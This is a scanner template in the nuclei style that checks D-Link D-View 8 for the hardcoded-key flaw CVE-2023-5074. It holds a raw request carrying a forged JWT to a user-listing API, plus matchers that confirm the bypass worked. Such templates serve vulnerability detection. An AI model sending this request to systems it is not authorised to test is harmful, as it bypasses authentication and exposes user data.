id: poc-yaml-d-link-d-view-8-hard-coded-key
info:
  name: D-Link D-View 8 Hardcoded Key Vulnerability (CVE-2023-5074)
  author: ProjectDiscoveryAI
  severity: critical
  tags: CVE-2023-5074,hardcoded-credentials
http:
  - raw:
      - |
        GET /dview8/api/usersByLevel HTTP/1.1
        Host: {{Hostname}}
        Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0..5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"code" : 200'
          - 'userName'
          - '"success" : true'
      - type: word
        part: body
        words:
          - '<'
        negative: true
